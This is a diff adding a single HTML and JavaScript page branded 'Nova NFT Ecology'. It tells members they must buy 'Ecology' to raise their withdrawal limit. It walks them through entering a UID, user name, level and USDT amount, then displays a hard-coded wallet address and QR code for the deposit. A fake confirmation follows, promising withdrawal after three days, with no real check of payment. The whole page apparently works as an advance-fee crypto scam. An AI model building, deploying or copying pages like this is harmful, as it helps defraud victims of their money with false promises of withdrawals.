@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nova NFT Ecology</title>
+
+<style>
+
+body{
+background:#0b0b0b;
+color:white;
+font-family:Arial;
+text-align:center;
+margin:0;
+}
+
+.header{
+background:black;
+padding:18px;
+font-size:22px;
+font-weight:bold;
+border-bottom:1px solid #333;
+}
+
+.container{
+max-width:420px;
+margin:auto;
+padding:20px;
+}
+
+.card{
+background:#141414;
+padding:20px;
+border-radius:15px;
+margin-top:20px;
+box-shadow:0 0 15px rgba(255,215,0,0.2);
+}
+
+.btn{
+background:linear-gradient(90deg,#ffe88a,#ffcc33);
+border:none;
+padding:12px;
+border-radius:10px;
+width:100%;
+font-size:16px;
+cursor:pointer;
+margin-top:15px;
+}
+
+input{
+width:90%;
+padding:12px;
+margin-top:10px;
+border-radius:8px;
+border:none;
+}
+
+.address{
+background:#111;
+padding:10px;
+border-radius:8px;
+margin-top:15px;
+word-break:break-all;
+}
+
+.copy{
+background:#333;
+color:white;
+border:none;
+padding:8px 12px;
+border-radius:6px;
+margin-top:8px;
+cursor:pointer;
+}
+
+.qr{
+width:220px;
+margin-top:15px;
+border-radius:10px;
+}
+
+.success{
+color:#00ff9c;
+margin-top:20px;
+font-size:16px;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="header">
+Nova NFT
+</div>
+
+<div class="container">
+
+<div class="card">
+
+<h3>Ecology Finance</h3>
+
+<p>
+Ecology is for members who want to withdraw their profit and principal amount.
+By purchasing Ecology your withdrawal limit increases and you can withdraw up to $1000.
+This is a very helpful process for activating higher withdrawal limits.
+</p>
+
+<button class="btn" id="investBtn" onclick="startInvest()">
+Invest
+</button>
+
+<div id="formArea"></div>
+
+<p id="successMsg" class="success"></p>
+
+</div>
+
+</div>
+
+<script>
+
+const wallet="0xcc24EC6c4E82CA8c0D1f96C71E149a030a4663B8";
+
+function startInvest(){
+
+document.getElementById("investBtn").style.display="none";
+
+document.getElementById("formArea").innerHTML=`
+<input id="uid" placeholder="Enter UID">
+<button class="btn" onclick="step2()">Next</button>
+`;
+
+}
+
+function step2(){
+
+if(document.getElementById("uid").value==""){
+alert("Enter UID");
+return;
+}
+
+document.getElementById("formArea").innerHTML=`
+<input id="username" placeholder="Enter User Name">
+<button class="btn" onclick="step3()">Next</button>
+`;
+
+}
+
+function step3(){
+
+if(document.getElementById("username").value==""){
+alert("Enter User Name");
+return;
+}
+
+document.getElementById("formArea").innerHTML=`
+<input id="level" placeholder="Enter Level">
+<button class="btn" onclick="step4()">Next</button>
+`;
+
+}
+
+function step4(){
+
+if(document.getElementById("level").value==""){
+alert("Enter Level");
+return;
+}
+
+document.getElementById("formArea").innerHTML=`
+<input id="amount" placeholder="Enter Deposit Amount (USDT)">
+<button class="btn" onclick="showDeposit()">Next</button>
+`;
+
+}
+
+function showDeposit(){
+
+let amount=document.getElementById("amount").value;
+
+if(amount==""){
+alert("Enter Amount");
+return;
+}
+
+document.getElementById("formArea").innerHTML=`
+
+<div class="address" id="wallet">
+${wallet}
+</div>
+
+<button class="copy" onclick="copyAddress()">Copy Address</button>
+
+<br>
+
+<img src="qr.png" class="qr">
+
+<button class="btn" onclick="finish()">Confirm Deposit</button>
+
+`;
+
+}
+
+function copyAddress(){
+
+navigator.clipboard.writeText(wallet);
+alert("Address copied");
+
+}
+
+function finish(){
+
+document.getElementById("formArea").innerHTML="";
+
+document.getElementById("successMsg").innerHTML=
+"Your Ecology purchase has been completed successfully. Please wait for 3 days. Because your account is Level 2, it may take up to 3 days to update. After that you can withdraw your funds.";
+
+document.getElementById("investBtn").style.display="block";
+
+}
+
+</script>
+
+</body>
+</html>
